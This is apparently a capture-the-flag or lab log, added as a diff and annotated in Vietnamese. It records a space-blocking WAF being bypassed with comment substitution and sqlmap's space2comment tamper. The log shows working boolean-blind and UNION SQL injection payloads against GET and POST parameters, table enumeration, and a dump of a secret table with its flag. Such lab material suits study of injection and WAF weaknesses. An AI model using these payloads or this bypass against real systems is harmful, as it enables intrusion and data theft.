@@ -1,0 +1,57 @@
+############################################################
+# 0. WAF ngay tho: chan khoang trang trong query string
+############################################################
+id=1 (binh thuong)      : <h1>San pham</h1><ul><li>#1 Ban phim co - 1200000 d</li></ul>
+id=1 AND 1=1 (co space) : 403 WAF: phat hien khoang trang trong tham so
+id=1/**/AND/**/1=1       : <h1>San pham</h1><ul><li>#1 Ban phim co - 1200000 d</li></ul>
+id=1/**/AND/**/1=2       : Khong tim thay san pham
+
+############################################################
+# A. sqlmap KHONG tamper -> bi WAF chan, bao khong injectable
+############################################################
+[17:24:45] [INFO] checking if the target is protected by some kind of WAF/IPS
+[17:24:45] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+[17:24:46] [WARNING] GET parameter 'id' does not seem to be injectable
+[17:24:46] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
+403 (Forbidden) - 13 times, 500 (Internal Server Error) - 2 times
+
+############################################################
+# B. sqlmap --tamper=space2comment -> tim ra + dump bang secret
+############################################################
+[17:24:47] [INFO] checking if the target is protected by some kind of WAF/IPS
+[17:24:47] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+[17:24:48] [INFO] target URL appears to have 3 columns in query
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    Type: boolean-based blind
+    Payload: id=1 AND 9892=9892
+    Type: UNION query
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,107,113,112,113)||CHAR(73,97,99,103,117,84,109,114,120,81,83,90,72,86,87,65,89,103,114,122,107,100,115,88,67,74,74,73,112,80,85,114,79,68,76,83,87,71,84,88)||CHAR(113,122,98,106,113)-- OlBn
+Table: secret
+[1 entry]
+| id | flag                                        | note   |
+| 1  | WEB{sqlmap_tamper_space2comment_bypass_waf} | co mat |
+
+############################################################
+# C. sqlmap --tables (liet ke bang)
+############################################################
+[17:24:49] [INFO] fetching tables for database: 'SQLite_masterdb'
+| products |
+| secret   |
+
+############################################################
+# D. sqlmap --data (injection qua POST, tham so code)
+############################################################
+[17:24:51] [WARNING] heuristic (basic) test shows that POST parameter 'code' might not be injectable
+[17:24:51] [INFO] POST parameter 'code' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[17:24:51] [INFO] POST parameter 'code' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'code' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    Type: boolean-based blind
+    Payload: code=kb01' AND 7220=7220 AND 'iZro'='iZro
+    Type: UNION query
+    Payload: code=-6811' UNION ALL SELECT NULL,CHAR(113,118,122,98,113)||CHAR(86,80,119,119,67,77,109,102,73,67,101,107,73,89,65,112,89,103,81,79,86,76,73,89,89,83,79,85,97,65,76,74,73,111,90,73,69,120,82,85)||CHAR(113,107,113,112,113)-- AkYZ
+Table: secret
+[1 entry]
+| id | flag                                        | note   |
+| 1  | WEB{sqlmap_tamper_space2comment_bypass_waf} | co mat |
+
+# Xong. FLAG lay duoc: WEB{sqlmap_tamper_space2comment_bypass_waf}
